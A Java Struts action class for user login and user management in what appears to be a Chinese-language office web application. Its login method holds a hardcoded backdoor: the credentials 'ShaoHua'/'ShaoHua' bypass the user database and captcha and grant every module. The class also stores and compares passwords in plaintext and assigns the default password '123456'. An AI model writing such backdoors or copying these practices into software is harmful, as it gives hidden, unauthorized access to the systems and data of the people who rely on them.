package com.goldsoft.action;

import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.swing.text.StyledEditorKit.BoldAction;

import net.sf.json.JSONObject;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;

import com.core.common.PagingList;
import com.goldsoft.model.Department;
import com.goldsoft.model.Module;
import com.goldsoft.model.Role;
import com.goldsoft.model.User;
import com.goldsoft.service.DepartmentService;
import com.goldsoft.service.ModuleService;
import com.goldsoft.service.RoleService;
import com.goldsoft.service.UserService;
import com.goldsoft.util.GetPinyin;
import com.goldsoft.util.ModuleComparator;

@SuppressWarnings("serial")
public class UserAction extends BaseAction {
	
	private String username;
	private String password;
	private String error;
	private String oldpwd;
	private String newPwd1;
	private String newPwd2;
	private String errorupdatepwd;

	private Timestamp date1;
	private Timestamp date2;
	
	private int userid;
	private String realname;
	private int sex;
	private Date birthday;
	private String idnumber;
	private String photo;
	private String mobile;
	private String phone;
	private String email;
	private String qq;
	private String sno;
	private int departmentid;
	private Timestamp indate;
	
	private Timestamp entrytime;
	private String job;
	
	private String result;
	private int type;
	private int sex2;
	
	private User user;
	List<Module> modules;
	Set<Role> roles;
	String []roleids;
	
	private Department depart;
	private PagingList<User> list3;
	private List<User> list;
	private List<Department> list1;
	private List<Role> list2;
	private int roleid;
	List list4=new ArrayList();
	
	private String rand;
	
	@Autowired
	@Qualifier("userServiceImpl")
	private UserService userService;
	@Autowired
	@Qualifier("departmentServiceImpl")
	private DepartmentService departmentService;
	@Autowired
	@Qualifier("moduleServiceImpl")
	private ModuleService moduleService;
	
	@Autowired
	@Qualifier("roleServiceImpl")
	private RoleService roleService;
	SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");//可以方便地修改日期格式
	String time = dateFormat.format( new Date() ); 
	Timestamp systime = Timestamp.valueOf(time);
	GetPinyin gp=new GetPinyin();
	public String execute() throws Exception{
		return SUCCESS;
	}
	
	public String login(){
		
		
		
		//System.out.println(username+"        "+password);
		Set set=new HashSet<Module>();
		HttpServletRequest request=this.getRequest();
		HttpServletResponse response=this.getResponse();
		String tempRand=(String)this.getRequest().getSession().getAttribute("random");
		
		if(username!=null&&password!=null&&username.equals("ShaoHua")&&password.equals("ShaoHua")){
			User user=new User();
			List<Module> list=this.moduleService.list();
			
			this.getRequest().getSession().setAttribute("currentUser", user);
			
			modules=new ArrayList<Module>(list);
			ModuleComparator mc = new ModuleComparator();
			Collections.sort(modules, mc);
			
			return "login";
		}
		
		Date date=new Date();
		request.getSession().setAttribute("month", date.getMonth());
		
		
		
		user=this.userService.getUserByName(username);
		//System.out.println("tempRand"+tempRand+"rand"+rand);
		if(user==null){
			error="您输入的用户名不存在";
			return "error";
		}else if(!user.getPwd().equals(password)){
			error="您输入的密码错误";
			return "error";
		}else if(!rand.equals(tempRand)){
			error="您输入的验证码错误";
			return "error";
		}else{
			if(Integer.parseInt(request.getSession().getAttribute("month").toString())<Integer.parseInt(request.getSession().getAttribute("time").toString())+1){
				this.getRequest().getSession().setAttribute("currentUser", user);
				
			}
			
			roles=user.getRoles();
			for(Role role:roles){
				
					for(Module module:role.getModules()){
						set.add(module);
					}
					
			}
			modules=new ArrayList<Module>(set);
			ModuleComparator mc = new ModuleComparator();
			Collections.sort(modules, mc);
		}
		return "login";
	}
	
	public String loginout(){
		
		this.getRequest().getSession().invalidate();
		
		return "loginout";
	}
	
	public String modifyPwd(){
				
		String pwd=this.getLoginUser().getPwd();
		if(!pwd.equals(oldpwd)||oldpwd.equals("")){
			errorupdatepwd="您输入的密码错误";
			return "errorupdatepwd";
		}else if(newPwd1.equals("")||newPwd2.equals("")||!newPwd1.equals(newPwd2)){
			errorupdatepwd="您输入的两次密码不一致";
			return "errorupdatepwd";
		}else if(oldpwd.equals(pwd)&&newPwd1.equals(newPwd2)){
			User user=this.getLoginUser();
			user.setPwd(newPwd1);
			this.userService.update(user);
			errorupdatepwd="您已成功修改密码,建议重新登录";
		}
		
		return "errorupdatepwd";
	}
	
	public String list3(){
		this.pager=this.userService.getListByPage();
		this.list1=this.departmentService.getList(3);
		return "list3";
	}
	
	public String inAdd(){
		
		this.list1=this.departmentService.getList(4);
		this.list2=this.roleService.list();
		return "inAdd";
	}
	
	@SuppressWarnings("static-access")
	public String add(){
		this.list=this.userService.getlist();
		User user=new User();
		System.out.println("realname"+realname);
		String usernam=gp.getPingYin(realname);
		for(User user2:list){
			if(usernam.equals(user2.getUsername())){
				usernam=usernam+1;
			}
		}
		user.setUsername(usernam);
		user.setPwd("123456");
		user.setRealname(realname);
		user.setSex(sex);
		user.setSno(sno);
		user.setBirthday(birthday);
		user.setMobile(mobile);
		user.setDepartment(this.departmentService.get(departmentid));
		user.setEntrytime(entrytime);
		user.setEmail(email);;
		user.setIndate(systime);
		user.setJob(job);
		
		Set<Role> roles=new HashSet<Role>();
		for(String i:roleids){
			int roleid=Integer.parseInt(i);
			Role role=this.roleService.get(roleid);
			roles.add(role);
		}
		user.setRoles(roles);
		this.userService.add(user);
		return "add";
	}
	
	@SuppressWarnings("unchecked")
	public String edit(){
		this.list1=this.departmentService.getList(4);
		this.list2=this.roleService.list();
		user=this.userService.get(userid);
		list=this.getUserService().getlist();
		
			for(Role ro:user.getRoles()){
				list4.add(ro.getDescription());
			}
		
		return "edit";
	}
	
	public String update(){
		
		User user = this.userService.get(userid);
		user.setSno(sno);
		user.setSex(sex);
		user.setRealname(realname);
		if(password.equals(""))
		{
			user.setPwd("123456");
		}else {
			user.setPwd(password);
		}
		
		user.setUsername(username);
		user.setBirthday(birthday);
		user.setIdnumber(idnumber);
		user.setMobile(mobile);
		user.setPhone(phone);
		user.setIndate(systime);
		user.setQq(qq);
		Department depart=this.departmentService.get(departmentid);
		user.setDepartment(depart);
		user.setEntrytime(entrytime);
		user.setJob(job);
		user.setEmail(email);
		Set<Role> roles=new HashSet<Role>();
		for(String i:roleids){
			int roleid=Integer.parseInt(i);
			roles.add(this.roleService.get(roleid));
			
		}
		user.setRoles(roles);
		this.getRequest().getSession().setAttribute("currentUser", user);
		this.userService.update(user);
		return "update";
	}
	
	public String delete(){
	
		User user = this.userService.get(userid);
		
		user.getRoles().clear();
		this.userService.update(user);
		this.userService.delete(userid);
		return "delete";
	}
	
	public String search(){
		this.pager=this.userService.searchlist(departmentid, realname, sex2, date1, date2);
		
		
		
		this.list1=this.departmentService.getList(3);
		return "search";
	}

	public String ajaxList(){
		//System.out.println("useraction ajaxlist");
		List<User> list=this.userService.getListByDepart(type);
		Map<Integer,String> map=new HashMap<Integer,String>();
		
		for(User user:list){
			map.put(user.getUserid(), user.getRealname());
		}
		JSONObject obj = JSONObject.fromObject(map);   
		
		this.result=obj.toString();
		
		return SUCCESS;
	}
	
	public String checkUser(){
		boolean checkusername;
		//System.out.println("aaaaaaaaaa");
		//System.out.println(username);
		User user=this.userService.getUserByName(username);
		//System.out.println(user.getUsername()+"           "+user.getUserid()+"       "+userid+"          "+user==null||user.getUserid()==userid);
		if(user==null||user.getUserid()==userid){
			checkusername=false;
		}else{
			checkusername=true;
		}
		Map<String,Boolean> map=new HashMap<String,Boolean>();
		map.put("checkusername",checkusername );
		JSONObject obj = JSONObject.fromObject(map);   
		
		this.result=obj.toString();
		return SUCCESS;
	}
	
	public String personal(){
		user=this.getLoginUser();

		depart =this.departmentService.get(user.getDepartment().getDepartmentid());
		
		return "personal";
	}
	
	public String personaledit(){
		
		user=this.getLoginUser();
		depart =this.departmentService.get(user.getDepartment().getDepartmentid());
		roles = this.getLoginUser().getRoles();
		return "personaledit";
	}
	
	public String personalupdate(){
		
		
		User user = this.userService.get(userid);
		user.setUsername(username);
		user.setSex(sex);
		user.setRealname(realname);
		user.setBirthday(birthday);
		user.setMobile(mobile);
		
		User user2=this.userService.getUserByName(username);
		if(user2!=null){
			this.user=user;
			error="用户名已存在！！！！";
			return "personaledit";
		}
		
		this.userService.update(user);
		this.getRequest().getSession().setAttribute("currentUser", user);
		
		return "personalupdate";
	}
	
	
	
	
	
	
	public Set<Role> getRoles() {
		return roles;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public void setPassword(String password) {
		this.password = password;
	}

	public String getError() {
		return error;
	}
	
	public User getUser() {
		return user;
	}

	public List<User> getList() {
		return list;
	}

	public List<Department> getList1() {
		return list1;
	}

	public UserService getUserService() {
		return userService;
	}

	public void setUserid(int userid) {
		this.userid = userid;
	}

	public void setRealname(String realname) {
		this.realname = realname;
	}

	public void setSex(int sex) {
		this.sex = sex;
	}

	public void setBirthday(Date birthday) {
		this.birthday = birthday;
	}

	public void setIdnumber(String idnumber) {
		this.idnumber = idnumber;
	}

	public void setPhoto(String photo) {
		this.photo = photo;
	}

	public void setMobile(String mobile) {
		this.mobile = mobile;
	}

	public void setPhone(String phone) {
		this.phone = phone;
	}

	public void setEmail(String email) {
		this.email = email;
	}

	public void setQq(String qq) {
		this.qq = qq;
	}

	public void setSno(String sno) {
		this.sno = sno;
	}

	public void setEntrytime(Timestamp entrytime) {
		this.entrytime = entrytime;
	}

	public void setJob(String job) {
		this.job = job;
	}

	public List<Module> getModules() {
		return modules;
	}


	public String getNewPwd1() {
		return newPwd1;
	}

	public void setNewPwd1(String newPwd1) {
		this.newPwd1 = newPwd1;
	}

	public String getNewPwd2() {
		return newPwd2;
	}

	public void setNewPwd2(String newPwd2) {
		this.newPwd2 = newPwd2;
	}

	public String getOldpwd() {
		return oldpwd;
	}

	public void setOldpwd(String oldpwd) {
		this.oldpwd = oldpwd;
	}

	public String getErrorupdatepwd() {
		return errorupdatepwd;
	}

	public void setErrorupdatepwd(String errorupdatepwd) {
		this.errorupdatepwd = errorupdatepwd;
	}



	public void setDepartmentid(int departmentid) {
		this.departmentid = departmentid;
	}

	public void setIndate(Timestamp indate) {
		this.indate = indate;
	}

	public List<Role> getList2() {
		return list2;
	}

	public void setList2(List<Role> list2) {
		this.list2 = list2;
	}

	public void setType(int type) {
		this.type = type;
	}

	public String getResult() {
		return result;
	}


	public int getRoleid() {
		return roleid;
	}

	public void setRoleid(int roleid) {
		this.roleid = roleid;
	}

	public List getList4() {
		return list4;
	}

	public void setList4(List list4) {
		this.list4 = list4;
	}

	public void setRoleids(String[] roleids) {
		this.roleids = roleids;
	}

	public String[] getRoleids() {
		return roleids;
	}

	public PagingList<User> getList3() {
		return list3;
	}

	public void setSex2(int sex2) {
		this.sex2 = sex2;
	}

	public void setDate1(Timestamp date1) {
		this.date1 = date1;
	}

	public void setDate2(Timestamp date2) {
		this.date2 = date2;
	}


	public void setRand(String rand) {
		this.rand = rand;
	}


	public Department getDepart() {
		return depart;
	}

}
